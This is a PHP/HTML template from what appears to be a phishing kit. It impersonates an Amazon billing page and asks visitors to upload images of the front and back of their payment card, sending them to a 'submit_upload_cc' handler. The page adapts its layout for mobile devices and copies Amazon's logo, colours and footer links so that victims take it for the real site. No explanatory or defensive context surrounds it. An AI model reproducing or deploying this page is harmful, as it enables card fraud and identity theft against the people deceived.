<html>
<head>
<title><?php echo $lang['billing']['title'];?></title>
<link rel='icon' href='../assets/img/favicon.ico'>
<link rel='stylesheet' href='../assets/css/mobile_login.css'>
<link rel='stylesheet' href='../assets/css/billing.css'>
<script type='text/javascript' src="../assets/js/jquery-1.9.1.js"></script>
<script type='text/javascript' src="../assets/js/jquery.validate.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.payment.js"></script>
<script type='text/javascript' src="../assets/js/additional-methods.min.js"></script>
<script type='text/javascript' src="../assets/js/jquery.maskedinput.js"></script>
<script type='text/javascript' src="../assets/js/validate.php"></script>
<meta charset='utf-8'>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
</head>
<body>
    <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<center>";
  } ?>

 <?php
  if($os == "Android" or $os == "iPhone") {
    echo '<header style="background-color:#232f3e;">
  <div class="hleft">
  <img style="margin-left:-15px;" src="../assets/img/logo.png" width="90px" height="30px"></img>
  </div>
  </header>';
  }else{
    echo '<br><header style="background-color:#fff;">
  <div class="hleft">
  <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
    height: 31px;
    width: 103px;" role="img" aria-label="Amazon"></i>
  </div>
  </header>';
  } 
  ?>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "</center>";
  } ?>
<center>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<br>";
  } ?>
<?php
  if($os == "Android" or $os == "iPhone") {
    echo '<div class="boxlogin">';
  }else{
    echo '<div style="width:400px;" class="boxlogin">';
  } 
  ?>
 <form action='submit_upload_cc?session=<?php echo $key;?>' method="post" enctype="multipart/form-data">
<div id="formbilling">
  <h4><?php echo $lang['upload']['weneed'];?> <?php echo $_SESSION['ending'];?>.</h4>
<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
<center><img id="gambardesktop" width="300" src="../assets/img/uploadcc.png"></center><br>
  <h4><?php echo $lang['upload']['frontcard'];?></h4>
  <input type="file" name="file" required="required"/><br><br>
  <h4><?php echo $lang['upload']['backcard'];?></h4>
  <input type="file" name="file2" required="required"/><br>
<br>
<input type='submit' class='button a-button-text' style="padding:10px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value='<?php echo $lang['billing']['update'];?>'>
</div></div>
</form>
</div>

</center>
<?php
if($os == "Android" or $os == "iPhone") {}else{
  echo "<br><br>";
} ?>
<?php
if($os == "Android" or $os == "iPhone") {
?>
<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
                    <div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">
                        <ul class="nav-ftr-horiz ">
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_cou?ie=UTF8&amp;id=cou" class="nav-a"><?php echo $lang['footer']['condi'];?></a></li>
                            <li class="nav-li "><a href="/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&amp;nodeId=468496" class="nav-a"><?php echo $lang['footer']['privacy'];?></a></li>
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_iba?ie=UTF8&amp;id=201308670" class="nav-a"><?php echo $lang['footer']['help'];?></a></li>
                        </ul>
                        <div id="nav-ftr-copyright"><?php echo $lang['footer']['copyright'];?></div>
                    </div>
                </footer>
<?php }?>
</body>
</html>
